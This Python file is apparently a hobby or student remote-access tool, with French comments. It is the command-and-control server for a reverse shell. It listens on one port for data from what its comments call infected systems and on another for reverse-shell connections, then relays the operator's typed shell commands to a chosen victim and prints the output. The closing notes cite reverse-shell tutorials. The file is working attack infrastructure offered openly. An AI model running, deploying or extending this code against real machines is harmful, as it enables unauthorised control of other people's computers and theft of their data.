#!/usr/bin/env python
#coding=utf-8
__author__ = "Karl Boulais"

import socket
import threading
import os
import platform
import json

from dao import Dao

class Server():
    def __init__(self):
        self._host = "0.0.0.0"
        self.cSocket = []
        self.cAddr = []
        self.inSession = False
        self._alreadyConnected = {}
        self._serverThreadList = [self._serverData, self._serverReverseShell]
        self.runningThreadList = []


    def returnServerList(self):
        pass

    @staticmethod
    def _clrscr():
            if platform.system() == "Linux":
                os.system("clear")
            elif platform.system() == "Windows":
                os.system("cls")


    def _sending(self, c, data):
        return c.send(bytes(json.dumps(data), "UTF-8"))
         
    
    def _receiving(self, c):
        data = ""
        while True:
            try:
                data += c.recv(1024).decode("UTF-8").strip()
                return json.loads(data)
            except ValueError:
                continue


    def _serverData(self, s):
        # Démarre le service pour recevoir les données des systèmes infectés

        c = None
        addr = None

        port = 9999
        s.bind((self._host, port))
        s.listen(5)

        while True:
            c, addr = s.accept()
            print('\nGot connection from', addr)

            # On crée un thread receiving data
            connection_handler = threading.Thread(
                target=self._clientData,
                args=(c,)
            )
            connection_handler.start()
            print(self.cSocket)
            
    def _clientData(self, c):
        data = {}
        quitting = False
        while not quitting:

            data = self._receiving(c)
            if data["message"] == "exit":
                c.close()
                quitting = True
            else:
                # print(data["message"])
                pass
            #TODO
            #if: data is different then update db
            #else: ignore.
            # print(str(data["RUNNINGSERVICES"]))
            # for k,v in data.items():
            #     print(k)
            #     print(v)
            # print("Receiving DATA")
            # TODO: Change print for DAO

    def _serverReverseShell(self, s):
        # Démarre le service pour recevoir les connexions ReverseShell
        c = None
        addr = None

        port = 6666

        s.bind((self._host, port))
        s.listen(5)

        while True:
            try:
                # Reçoit les connexions
                c, addr = s.accept()
                
                # Ajoute les connexions dans une liste d'objet cSocket et cAddr
                self.cSocket.append(c)
                self.cAddr.append(addr)

                print('\nGot connection from', addr)
            except socket.timeout:
                continue
    
    def _reverseShell(self, c):

        quitting = False
        data = {}

        try:
            data['cwd'] = self._alreadyConnected[c]
        except KeyError:
            # Reçoit le premier message et initialise data["cwd"]
            data = self._receiving(c)
            self._alreadyConnected[c] = data['cwd']
        
        while not quitting:
            try:
                # On envoi une commande
                data["command"] = input(f"{data['cwd']} $> ")
                if not data["command"].strip():
                    continue
                elif data["command"].lower() == "cls" or data["command"].lower() == "clear":
                    self._clrscr()
                    continue
                else:
                    self._sending(c, data)
                    data = self._receiving(c)
                
                if data["command"].lower() == "destroy":
                    self.cSocket.pop(self.cSocket.index(c))
                    quitting = True
                    c.close()
                    self.inSession = False
                    continue
                if data["command"].lower() == "exit":
                    quitting = True
                    self.inSession = False
            
                print(data["output"])
            except ConnectionResetError:
                self.cSocket.pop(self.cSocket.index(c))
                quitting = True
                c.close()
                self.inSession = False
            except KeyboardInterrupt:
                break
  
    def startReverseShellInstance(self, c):
        threading.Thread(target=self._reverseShell, args=(c,)).start()

    
    def main(self):
        # Démarre deux threads pour recevoir les connexions: 1- ReverseShell 2- reception de données
        for server in self._serverThreadList:
            s = socket.socket()
            threading.Thread(target=server, args=(s,), daemon=True).start()

if __name__ == "__main__":
   Server().main()



'''
.. rubric:: Notes de bas de page

.. [1]  https://www.tutorialspoint.com/python_network_programming/python_sockets_programming.htm 
        Principe de base d'une connexion TCP avec le module socket
.. [2]  https://gist.github.com/Integralist/3f004c3594bbf8431c15ed6db15809ae
        Utilisation de thread pour prendre en charge plusieurs connexions client à la fois
.. [3]  https://www.thepythoncode.com/article/create-reverse-shell-python
        Création d'un reverse shell
.. [4]  https://github.com/spectertraww/PwnLnX
        Création d'une liste d'object c_socket pour pouvoir intéragir à notre guise avec chaque connexion

'''